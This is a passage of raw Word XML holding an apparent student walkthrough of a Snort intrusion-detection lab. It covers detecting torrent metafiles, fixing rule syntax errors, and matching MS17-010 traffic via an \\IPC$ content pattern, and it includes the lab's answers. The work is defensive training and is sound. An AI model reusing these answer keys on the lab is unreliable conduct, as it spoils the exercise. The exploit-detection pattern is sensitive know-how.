    <w:p w14:paraId="1122203C" w14:textId="1E237DFA" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>- gif89a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="653B5026" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2F7E9E0B" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Task 5: Writing IDS Rules (Torrent Metafile)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2781D67A" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="454755BD" w14:textId="77777777" w:rsidR="00666929" w:rsidRDefault="00261C8C" w:rsidP="00666929">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Change the directory to Task 5. We will write a rule to detect torrent metafiles in the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>pcap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">. Torrent files have an extension of ".torrent". We are going to change the content </w:t>
      </w:r>
      <w:r w:rsidR="00666929">
        <w:t>to “</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">torrent". </w:t>
      </w:r>
      <w:r w:rsidR="00666929">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4382537E" wp14:editId="588DA5A5">
            <wp:extent cx="5486400" cy="327660"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="11011975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7660"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CB111C5" w14:textId="63EF8934" w:rsidR="00666929" w:rsidRDefault="00666929" w:rsidP="00666929">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3.7: The rule that was created for detecting torrent files</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A8BAF36" w14:textId="2B465C15" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Run "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>sudo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> snort -r </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>torrent.pcap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> -c </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>local.rules</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>l .</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidR="00666929">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>What is the number of detected packets?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BCD95C5" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>- 2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BEC0F82" w14:textId="77777777" w:rsidR="00666929" w:rsidRDefault="00666929" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="72D07A7A" w14:textId="6B04382D" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Investigate the log/alarm files. Run "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>sudo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> snort -r snort.log.1740010273 -X". What is the name of the torrent application? </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42F798B9" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>bittorrent</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="650C9725" w14:textId="77777777" w:rsidR="00666929" w:rsidRDefault="00666929" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="48B4C094" w14:textId="36E18490" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">What is the MIME (Multipurpose Internet Mail Extensions) type of </w:t>
      </w:r>
      <w:r w:rsidR="00666929">
        <w:t>torrent</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> metafile?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="594CD53E" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>- application/x-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>bittorrent</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="739D7F71" w14:textId="2F0F6320" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7C2EFCAC" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>What is the hostname of the torrent metafile?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31A03E9B" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>- tracker2.torrentbox.com</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="595D6E3C" w14:textId="124AF544" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="705ACCBC" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Task 6: Troubleshooting Rule Syntax Errors</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="666D3970" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0A75AFA6" w14:textId="77777777" w:rsidR="00666929" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Change the directory to Task 6. We will troubleshoot syntax errors. Nano local-1.rules to edit it.</w:t>
      </w:r>
      <w:r w:rsidR="00666929">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">There is no space between "any" and the parenthetical section. </w:t>
      </w:r>
      <w:r w:rsidR="00666929">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="77D6CD70" wp14:editId="06943741">
            <wp:extent cx="5478780" cy="190500"/>
            <wp:effectExtent l="0" t="0" r="7620" b="0"/>
            <wp:docPr id="10575215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190500"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="342E647C" w14:textId="23D75627" w:rsidR="00666929" w:rsidRDefault="00666929" w:rsidP="00666929">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3.</w:t>
      </w:r>
      <w:r w:rsidR="00DF644C">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>8</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">: The </w:t>
      </w:r>
      <w:r w:rsidR="00DF644C">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>first rule with a syntax error</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A078682" w14:textId="27D44110" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Run "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>sudo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> snort -r mx-</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>1.pcap</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> -c local-1.rules -</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>l .</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidR="00DF644C">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>What is the number of the detected packets?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DC019EB" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>- 16</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BA694AA" w14:textId="77777777" w:rsidR="00DF644C" w:rsidRDefault="00DF644C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="446DAAF3" w14:textId="5125D4BE" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Nano local-2.rules. An </w:t>
      </w:r>
      <w:r w:rsidR="00DF644C">
        <w:t>“</w:t>
      </w:r>
      <w:r>
        <w:t>any</w:t>
      </w:r>
      <w:r w:rsidR="00DF644C">
        <w:t>”</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is missing under the source IP part of the rule. Run the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>pcap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> packet. What is the number of the detected packets?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E4400B9" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>- 68</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C3526B6" w14:textId="77777777" w:rsidR="00DF644C" w:rsidRDefault="00DF644C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="51DC87E2" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Nano local-3.rules. The </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>sid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> for each rule is the same value. Run the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>pcap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>. What is the number of the detected packets?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1455B84E" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>- 87</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FBF2158" w14:textId="77777777" w:rsidR="00DF644C" w:rsidRDefault="00DF644C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="378C3B96" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Nano local-4.rules. A colon should be a semi-colon in the parenthetical section, and the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>sid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> is the same for both rules again. Run the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>pcap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>. What is the number of the detected packets?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19D6CCA0" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>- 90</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C44B841" w14:textId="77777777" w:rsidR="00DF644C" w:rsidRDefault="00DF644C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6074D583" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Nano local-5.rules. The second rule cannot be put in that direction. It should be "-&gt;". The second </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>sid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> has a semi-colon instead of a colon. In the third rule, the msg option ends with a colon instead of a semi-colon. Run the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>pcap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>. What is the number of the detected packets?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D2FF60D" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>- 155</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="421F2B99" w14:textId="77777777" w:rsidR="00DF644C" w:rsidRDefault="00DF644C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="33FF4D68" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Nano local-6.rules. The content is looking for "GET" in hexadecimal but the "GET" is lowercase. Simply change the hex to "GET" with alphabetical characters. Run the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>pcap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>. What is the number of the detected packets?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AB4D7BF" w14:textId="77777777" w:rsidR="00DF644C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>- 2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AEF9F18" w14:textId="48A7715D" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Nano local-7.rules. Using a HEX to Text, the HEX is converted to .html (https://cryptii.com/pipes/hex-to-text). The rules </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>is</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> missing a msg: for html files. What is the name of the required option?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05B73EB4" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>- msg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61ED30EB" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="637A83AE" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Task 7: Using External Rules (MS17-010)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E1AA205" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0EC684AB" w14:textId="7E13B28B" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Change the directory to Task 7. Run the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>pcap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> file with </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>local.rules</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>. What is the number of detected packets?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70DC487E" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>- 25154</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DD608B4" w14:textId="2034F036" w:rsidR="00261C8C" w:rsidRDefault="00DF644C" w:rsidP="00DF644C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="29F0037D" wp14:editId="7D57BE78">
            <wp:extent cx="4084320" cy="937260"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1514405091" name="Picture 43" descr="A grey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5091" name="Picture 43" descr="A grey background with white number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4320" cy="937260"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A32F9DB" w14:textId="4CF3B841" w:rsidR="00DF644C" w:rsidRDefault="00DF644C" w:rsidP="00DF644C">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3.9: Number of detected packets for Task 7</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2718AFD8" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="791EABC3" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Edit the local-1.rules document to search for a \\IPC$ keyword. </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>![</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t>[Pasted image 20250219200803.png</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>]]Run</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>pcap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> with the local-1.rules. What is the number of detected packets?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28B03DD2" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>- 12</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="714F0B86" w14:textId="77777777" w:rsidR="00DF644C" w:rsidRDefault="00DF644C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
